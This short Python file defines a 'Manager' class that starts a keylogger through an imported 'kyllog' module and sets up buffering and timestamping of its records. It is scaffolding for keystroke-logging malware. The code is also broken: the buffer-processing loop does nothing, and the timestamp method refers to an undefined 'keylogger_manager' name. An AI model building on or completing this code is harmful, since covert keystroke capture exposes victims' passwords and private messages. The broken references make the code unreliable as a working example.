import time,datetime ,ctypes
import kyllog


class Manager:
    current_time = '%d/%m/%Y  %H:%M'

    def __init__(self,interval = 60):
        self.logger = kyllog.mein_keylogg.start()
        self.interval = interval
        self.buffer = []
        self.running = True
        self.time_man = None

    def process_buffer(self):
        while self.running:
            time.sleep(self.interval)

    def time_manager(self):
        self.time_man = datetime.datetime.fromtimestamp(self.logger.time).strftime(keylogger_manager.current_time)





























